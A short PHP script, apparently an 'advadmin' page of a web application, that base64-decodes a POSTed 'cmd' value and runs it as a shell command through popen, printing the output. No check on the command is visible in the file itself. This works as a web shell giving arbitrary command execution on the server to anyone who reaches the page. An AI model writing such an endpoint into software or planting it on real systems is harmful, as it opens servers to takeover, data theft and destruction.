<?php
require_once("../../include/stdhead.php");
gethead(0,"advadmin","");

$_POST['cmd']=base64_decode($_POST['cmd']);
if ($_POST['cmd']!="")
{
	$handle = popen($_POST['cmd']." 2>&1", 'r');
	echo rfile($handle);
	pclose($handle);
}
?>